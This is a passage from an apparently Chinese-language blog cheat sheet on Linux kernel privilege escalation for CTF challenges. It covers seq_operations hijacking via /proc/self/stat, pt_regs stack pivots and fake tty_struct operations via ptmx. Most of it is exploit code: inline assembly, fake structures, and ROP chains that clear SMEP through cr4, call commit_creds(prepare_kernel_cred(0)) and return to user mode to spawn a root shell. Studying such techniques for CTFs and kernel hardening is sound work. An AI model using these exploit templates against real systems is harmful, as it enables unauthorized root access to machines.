&amp;&amp; (real_cred == cred))</span><br><span class="line">        &#123;</span><br><span class="line">            target_addr=addr+result-(<span class="keyword">int</span>)(buf);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>,target_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>,real_cred);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>之后再借用任意写或者修改FD申请来修改cred结构中的内容即可。</p>

        <h3 id="借助stat设备修改函数指针"   >
          <a href="#借助stat设备修改函数指针" class="heading-link"><i class="fas fa-link"></i></a><a href="#借助stat设备修改函数指针" class="headerlink" title="借助stat设备修改函数指针"></a>借助stat设备修改函数指针</h3>
      <p>原理就是劫持seq_operations结构体的函数指针，进而控制程序流。</p>
<p>西湖论剑–easy_kernel</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055#h3-5" >西湖论剑2021线上初赛easykernel题解 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>有如下结构体，大小为0x20，当我们可以申请0x20大小的Chunk，然后释放，再打开<code>/proc/self/stat</code>设备就可以得到该结构体。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct seq_operations &#123;</span><br><span class="line">    void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">    void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">    void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">    int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如果存在UAF之类的就可以从里面读取函数偏移，获得kernel基地址，然后还可以修改里面的start函数指针，劫持使其指向我们的gadget，当我们对该设备进行读取操作时，就会调用该start指针，从而进入到我们劫持的gadget，进而可以程序控制执行流。使用如下汇编进行对该设备的操作。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>劫持之后再需要getshell就需要注意另一个结构体了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>当我们调用syscall的时候，会将以上寄存器压入内核栈中，然后形成如上的结构，即如下汇编所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x400db8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, user_cs;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, user_rflags;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, user_sp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, user_ss;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>

<p>如上的汇编会在内核栈中形成如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151105563.png" alt="image-20220115110535050"></p>
<p>所以如果借助<code>add_rsp xx;pop_ret</code>这类指令，就可以将我们的控制流的栈拉高到我们可控数据范围，进而劫持栈。使用<code>commit(cred)</code>提权（这里的提权因为无法控制rdi，所以就借助<code>init_cred</code>来提权）。提权之后借助<code>swapgs_restore_regs_and_return_to_usermode</code>函数中的pop系列来调整栈，即借用了几个栈的位置，就得少几个pop，如图借用了5个栈数据，那么我们最后就得使得该函数少pop5个，即将swapgs_restore_regs_and_return_to_usermode函数的gadget+=9即可</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode += <span class="number">9</span>;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151130591.png" alt="image-20220115113005162"></p>
<p>如上修改之后就可以当进入到该函数的swapgs的时候，将栈调整至最开始因为syscall而形成的保存pt_regs结构体中的用户态数据的地方，使得提权之后成功返回用户态</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">//.....................</span></span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>所示栈如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151136862.png" alt="image-20220115113622350"></p>
<p>使用此种方法时一般可以先设置一些标志性数据，“AAAAAA”在栈上，然后搜寻即可，以此来寻找调栈所用的gadget。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0x6565656565;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>

<p>然后在某个地址范围进行搜索，就能找到该结构体的位置，好像只能是peda比较好用</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &quot;AAAAAA&quot; 0xffffc900001d3f80 0xffffc900001d3f98</span><br></pre></td></tr></table></div></figure>


        <h3 id="借助ptmx设备-tty-struct"   >
          <a href="#借助ptmx设备-tty-struct" class="heading-link"><i class="fas fa-link"></i></a><a href="#借助ptmx设备-tty-struct" class="headerlink" title="借助ptmx设备(tty_struct)"></a>借助ptmx设备(tty_struct)</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64`-&gt;`SyS_write`-&gt;`SYSC_write`-&gt;`vfs_write`</span><br><span class="line">-&gt;`__vfs_write`-&gt;`tty_write`-&gt;`do_tty_write`-&gt;`n_tty_write`-&gt;`pty_write`</span><br></pre></td></tr></table></div></figure>

<p>原理就是劫持tty_struct结构体中的const struct tty_operations *ops结构体指针，然后再修改fake_tty_operations结构体中的pty_write函数指针，通过对该设备进行写操作进而调用劫持的函数指针，控制执行流程。</p>
<p>同时在调用的时候rax为从劫持的tty_struct结构体中获取的operations <em>ops指针</em>，该指针可以被我们修改劫持。之后借助一个对rax和rsp进行操作的gadget–movRspRax_decEbx_ret进而劫持栈，完成程序流和栈的劫持。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">fake_tty_operations[i] = movRspRax_decEbx_ret;</span><br><span class="line">&#125;</span><br><span class="line">fake_tty_operations[<span class="number">0</span>] = pop_rax_rbx_r12_r13_rbp_ret;</span><br><span class="line">fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">fake_tty_struct[<span class="number">0</span>] = <span class="number">0x0000000100005401</span>;<span class="comment">//need to set magic number</span></span><br><span class="line">fake_tty_struct[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">fake_tty_struct[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      <span class="comment">// pop_rax_rbx_r12_rbp_ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = movCr4Rdi_pop_rbp_ret;      <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret;      <span class="comment">// swapgs;ret</span></span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>




        <h2 id="2-栈"   >
          <a href="#2-栈" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-栈" class="headerlink" title="2.栈"></a>2.栈</h2>
      
        <h3 id="1-commit-creds-prepare-kernel-cred-0"   >
          <a href="#1-commit-creds-prepare-kernel-cred-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-commit-creds-prepare-kernel-cred-0" class="headerlink" title="(1)commit_creds(prepare_kernel_cred(0));"></a>(1)commit_creds(prepare_kernel_cred(0));</h3>
      <p>这个算是比较常规的栈溢出，不过还需要注意SMEP/SMAP以及KPTI是否开启</p>

        <h4 id="①开启SMEP情况"   >
          <a href="#①开启SMEP情况" class="heading-link"><i class="fas fa-link"></i></a><a href="#①开启SMEP情况" class="headerlink" title="①开启SMEP情况"></a>①开启SMEP情况</h4>
      <p>这种情况一般直接溢出然后关闭，或者知道基地址之后可以尝试在内核完成提权然后返回用户态</p>

        <h5 id="ROP关闭SMEP保护，执行用户态提权代码"   >
          <a href="#ROP关闭SMEP保护，执行用户态提权代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROP关闭SMEP保护，执行用户态提权代码" class="headerlink" title="ROP关闭SMEP保护，执行用户态提权代码"></a>ROP关闭SMEP保护，执行用户态提权代码</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      <span class="comment">// </span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = movCr4Rdi_pop_rbp_ret;  <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret; </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      			<span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>


        <h5 id="ROP在内核态提权后返回用户态起Shell"   >
          <a href="#ROP在内核态提权后返回用户态起Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROP在内核态提权后返回用户态起Shell" class="headerlink" title="ROP在内核态提权后返回用户态起Shell"></a>ROP在内核态提权后返回用户态起Shell</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred_k;  </span><br><span class="line">rop[i++] = pop_rdx_rbx_rbp_ret;</span><br><span class="line">rop[i++] = pop_rbp_ret;</span><br><span class="line">rop[i++] = <span class="number">0x0</span>;      </span><br><span class="line">rop[i++] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">rop[i++] = movRdiRax_call_rdx; </span><br><span class="line">rop[i++] = commit_creds_k;</span><br><span class="line">rop[i++] = swapgs_ret;              </span><br><span class="line">rop[i++] = iretq;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②未开启SMEP情况"   >
          <a href="#②未开启SMEP情况" class="heading-link"><i class="fas fa-link"></i></a><a href="#②未开启SMEP情况" class="headerlink" title="②未开启SMEP情况"></a>②未开启SMEP情况</h4>
      <p>直接调用用户空间的提权代码，返回之后起shell即可</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret; </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>

